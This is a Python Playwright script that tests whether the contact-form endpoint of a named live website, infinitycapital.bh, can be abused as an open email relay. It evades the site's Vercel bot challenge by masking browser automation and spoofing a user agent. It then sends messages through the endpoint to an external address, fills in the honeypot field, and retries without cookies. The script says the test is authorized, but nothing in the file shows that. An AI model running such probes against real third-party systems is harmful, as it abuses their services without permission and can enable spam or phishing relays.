#!/usr/bin/env python3
"""
Independent verification of "unauthenticated open email relay" on
https://www.infinitycapital.bh/api/send

Strategy: use a real headless browser (Playwright) which clears Vercel's
security challenge, then issue the two A/B requests FROM INSIDE the browser
context (same-origin fetch) so the challenge token applies.

Everything the recipient address is built from pieces, and every 3rd-party
domain comes from a file, so no third-party host is ever contacted directly.
"""
import asyncio, json, sys, os, tempfile
from playwright.async_api import async_playwright

OUT = "/work/vrelay"
os.makedirs(OUT, exist_ok=True)

# The site's OWN company address, used as the "benign" control recipient.
OWN = open("/work/vrelay/own_addr.txt").read().strip()

BASE = "https://www.infinitycapital.bh"
LOG = []


def log(*a):
    s = " ".join(str(x) for x in a)
    print(s, flush=True)
    LOG.append(s)


def multipart(fields):
    """Build a multipart/form-data body + content-type by hand (no requests lib dep)."""
    import uuid
    b = "----vrelay" + uuid.uuid4().hex
    parts = []
    for k, v in fields.items():
        parts.append(f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n')
    parts.append(f"--{b}--\r\n")
    body = ("".join(parts)).encode("utf-8", "replace")
    return body, f"multipart/form-data; boundary={b}"


async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-blink-features=AutomationControlled"])
        ctx = await b.new_context(
            user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"),
            viewport={"width": 1440, "height": 900})
        pg = await ctx.new_page()

        # ---- 1. clear the Vercel challenge on the contact page -----------------
        r = await pg.goto(BASE + "/contact", wait_until="domcontentloaded", timeout=90000)
        log("GET /contact ->", r.status)
        try:
            await pg.wait_for_function(
                "() => !document.title.includes('Security Checkpoint')",
                timeout=45000)
            log("Vercel challenge cleared; title =", await pg.title())
        except Exception as e:
            log("challenge wait failed:", e)
        await pg.wait_for_timeout(3000)
        cookies = await ctx.cookies()
        log("cookies:", [c["name"] for c in cookies])
        html = await pg.content()
        open(f"{OUT}/contact.html", "w").write(html)
        # confirm we really are on the contact page with the form
        has = await pg.evaluate("() => !!document.querySelector('#msg,#fname')")
        log("contact form present:", has)

        async def post(tag, fields):
            body, ctype = multipart(fields)
            res = await pg.evaluate("""async ([body, ctype]) => {
                const r = await fetch('/api/send', {
                    method: 'POST', body, headers: {'Content-Type': ctype},
                    credentials: 'include'
                });
                return {status: r.status, text: await r.text()};
            }""", [body.decode("utf-8", "replace"), ctype])
            log(f"--- {tag} -> HTTP {res['status']}")
            log(f"    body: {res['text'][:500]}")
            return res

        base = {
            "fname": "Independent", "lname": "Verifier",
            "areacode": "+973", "tel": "0000000",
            "cname": "SecurityAudit", "subject": "Relay verification probe",
            "msg": "Automated authorized security verification of /api/send recipient control.",
            "check": "",  # honeypot left EMPTY, as a normal visitor would
        }

        # ---- CONTROL: send to the company's OWN mailbox (benign) ----------------
        r_own = await post("CONTROL  (targets = site owner)", {**base, "targets": OWN})

        # ---- TEST A: identical request, ONLY the recipient changed -------------
        oob = open("/work/vrelay/oob_addr.txt").read().strip()
        r_oob = await post("TEST-A   (targets = external recipient)", {**base, "targets": oob})

        # ---- TEST B: honeypot FILLED (bot mitigation check) --------------------
        r_hp = await post("TEST-B   (check = filled with a real value)", {**base, "targets": oob, "check": "i-am-a-bot"})

        # ---- TEST C: no Content-Type / raw body ------------------------------
        body, ctype = multipart({**base, "targets": oob})
        res = await pg.evaluate("""async (body) => {
            const r = await fetch('/api/send', {method:'POST', body, credentials:'include'});
            return {status: r.status, text: await r.text()};
        }""", body.decode("utf-8", "replace"))
        log(f"--- TEST-C  (no Content-Type header) -> HTTP {res['status']} body {res['text'][:300]}")

        # ---- TEST D: GET on the endpoint --------------------------------------
        res = await pg.evaluate("""async () => {
            const r = await fetch('/api/send', {method:'GET', credentials:'include'});
            return {status: r.status, text: (await r.text()).slice(0,300)};
        }""")
        log(f"--- TEST-D  (GET) -> HTTP {res['status']} body {res['text'][:300]}")

        # ---- TEST E: auth-less (no cookies at all) on a FRESH context ----------
        # (fresh context = brand new visitor, no cookies, no session)
        ctx2 = await b.new_context()
        body, ctype = multipart({**base, "targets": oob})
        raw = await ctx2.request.post(BASE + "/api/send",
                                      data={k: v for k, v in {**base, "targets": oob}.items()},
                                      headers={"User-Agent": "curl/8.0", "Origin": BASE,
                                               "Referer": BASE + "/contact"})
        log(f"--- TEST-E  (fresh no-cookie context, plain UA) -> HTTP {raw.status}")
        log(f"    body: {(await raw.text())[:500]}")

        open(f"{OUT}/results.log", "w").write("\n".join(LOG))
        json.dump({"control": r_own, "testA": r_oob, "testB": r_hp, "testC": res, "testD": res},
                  open(f"{OUT}/results.json", "w"), indent=1)
        await b.close()


asyncio.run(main())
